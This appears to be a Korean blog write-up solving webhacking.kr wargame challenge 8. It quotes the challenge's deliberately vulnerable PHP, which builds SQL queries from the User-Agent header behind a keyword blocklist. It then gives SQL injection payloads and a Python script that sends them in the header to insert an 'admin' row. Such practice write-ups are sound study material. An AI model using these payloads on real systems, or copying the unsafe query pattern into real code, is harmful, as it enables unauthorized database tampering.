---
title: "webhacking.kr 8번 문제 풀이"
excerpt_separator: "<!--more-->"
categories:
  - webhacking
tags:
  - webhacking
  - wargame
classes: wide
---

[8번 바로가기](http://webhacking.kr/challenge/web/web-08/)

문제 페이지에 들어가면 아래와 같은 화면이 나온다. http 헤더의 user-agent를 조작하는 문제라는 느낌을 준다.

![8번](/img/8번_1.JPG)

새로 고침을 하면 done! 뒤의 숫자가 1 증가한다. 70번을 다 채우면 뭔가 있을 것 같다.
소스를 보면 index.phps에 들어가라는 힌트가 있다.


```php
$agent=getenv("HTTP_USER_AGENT");
$ip=$_SERVER[REMOTE_ADDR];

$agent=trim($agent);

$agent=str_replace(".","_",$agent);
$agent=str_replace("/","_",$agent);

$pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";

$agent=strtolower($agent);

if(preg_match($pat,$agent)) exit("Access Denied!");

$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
$_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);

$count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
if($count_ck[0]>=70) { @mysql_query("delete from lv0"); }


$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


}

if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}
```

http 헤더의 user-agent 필드에 있는 값에서 sqli에 사용되는 여러 문자를 필터링하고 쿼리를 수행한다.
먼저 lv0 테이블에서 id 컬럼에 값이 몇개 있는지 가져오는데, 이게 70개가 넘어가면 lv0 테이블을 비운다.
그리고 lv0 테이블에서 user-agent에 해당하는 레코드의 id 값을 가져온다. 여기서 첫번째 값이 "admin" 이면 문제가 풀린다.
그 밑에 보면 user-agent에 해당하는 값이 없으면 새로 입력하는데, 이때 user-agent에 넣은 값이 쿼리에 사용된다. user-agent에 쿼리를 넣어 문제 id에 admin을 삽입하면 된다.


일단 '$pat'에서 싱글쿼터를 필터링하지 않는다. select 문에서는 다시 `$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);`

에서 싱글쿼터를 필터링하는데, insert문에서는 `$agent`를 그대로 사용하기 때문에 싱글쿼터를 필터링하지 않는다.
`insert into lv0(agent,ip,id) values('$agent','$ip','guest');`

에서 agent에 `hihi', '0', 'admin')#` 이런식으로 쿼리를 넣거나, `a1','i1','admin'), ('a2` 이렇게 주석을 사용 안하고 한 번에 여러 레코드를 삽입하는 쿼리를 만들면 된다.

![8번](/img/8번_2.JPG)


```python
import urllib.request

agent1 = "hihi', '0', 'admin')#'"
agent2 = "hihi"
header = {'User-Agent':agent1, 'Cookie':'PHPSESSID=본인세션쿠키값'}

req = urllib.request.Request("http://webhacking.kr/challenge/web/web-08/index.php", headers=header)
data = urllib.request.urlopen(req).read()
data = data.decode('UTF-8')

print(data)

header['User-Agent'] = agent2

req = urllib.request.Request("http://webhacking.kr/challenge/web/web-08/index.php", headers=header)
data = urllib.request.urlopen(req).read()
data = data.decode('UTF-8')

print(data)
```
